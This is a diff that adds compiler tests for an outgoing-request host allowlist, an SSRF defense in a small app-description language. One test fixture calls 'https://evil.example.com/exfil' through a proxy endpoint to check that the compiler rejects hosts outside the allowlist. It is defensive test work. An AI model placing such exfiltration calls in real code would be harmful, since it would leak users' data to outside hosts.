@@ -5275,6 +5275,70 @@ create a Deals table:
 });
 
 // =============================================================================
+// OWASP Piece 2 — outgoing requests allowlist (SSRF defense)
+// =============================================================================
+// `allow outgoing requests to: 'api.stripe.com', 'api.openai.com'` declares
+// which external hosts the app is allowed to call. With the declaration in
+// place, every http_request / external fetch must (a) use a string literal
+// URL, AND (b) target a host in the allowlist. Without the declaration, the
+// existing private-network block stays as the only check (back-compat).
+describe('OWASP Piece 2 - outgoing requests allowlist (SSRF defense)', () => {
+  it('parses `allow outgoing requests to: ...` into an OUTGOING_ALLOWLIST node', () => {
+    const ast = parse("allow outgoing requests to: 'api.stripe.com', 'api.openai.com'");
+    const node = ast.body.find(n => n.type === 'outgoing_allowlist');
+    expect(node).toBeDefined();
+    expect(node.hosts).toEqual(['api.stripe.com', 'api.openai.com']);
+  });
+
+  it('errors when http_request targets a host NOT in the allowlist', () => {
+    const src = `target: backend
+allow outgoing requests to: 'api.stripe.com'
+
+when user calls POST /api/proxy:
+  result = call api 'https://evil.example.com/exfil'
+  send back result`;
+    const r = compileProgram(src);
+    expect(r.errors.length).toBeGreaterThan(0);
+    const errMsgs = (r.errors || []).map(e => typeof e === 'string' ? e : (e.message || '')).join(' | ');
+    expect(errMsgs).toMatch(/evil\.example\.com|not.*allowlist|not allowed/i);
+  });
+
+  it('compiles clean when http_request targets a host IN the allowlist', () => {
+    const src = `target: backend
+allow outgoing requests to: 'api.stripe.com'
+
+when user calls POST /api/charge:
+  result = call api 'https://api.stripe.com/v1/charges'
+  send back result`;
+    const r = compileProgram(src);
+    expect(r.errors).toHaveLength(0);
+  });
+
+  it('errors when the allowlist is declared and the URL is a variable (not a literal)', () => {
+    const src = `target: backend
+allow outgoing requests to: 'api.stripe.com'
+
+when user calls POST /api/dynamic:
+  target_url = 'https://api.stripe.com/v1/anything'
+  result = call api target_url
+  send back result`;
+    const r = compileProgram(src);
+    expect(r.errors.length).toBeGreaterThan(0);
+    const errMsgs = (r.errors || []).map(e => typeof e === 'string' ? e : (e.message || '')).join(' | ');
+    expect(errMsgs).toMatch(/literal|string/i);
+  });
+
+  it('does NOT error when no allowlist is declared (back-compat with existing apps)', () => {
+    const src = `target: backend
+when user calls POST /api/proxy:
+  result = call api 'https://api.example.com/data'
+  send back result`;
+    const r = compileProgram(src);
+    expect(r.errors).toHaveLength(0);
+  });
+});
+
+// =============================================================================
 // OWASP Piece 1, cycle 4 — validator errors when a rule names a missing role field
 // =============================================================================
 // `the deal's reviewer can read or change` implies a `reviewer_id` field on
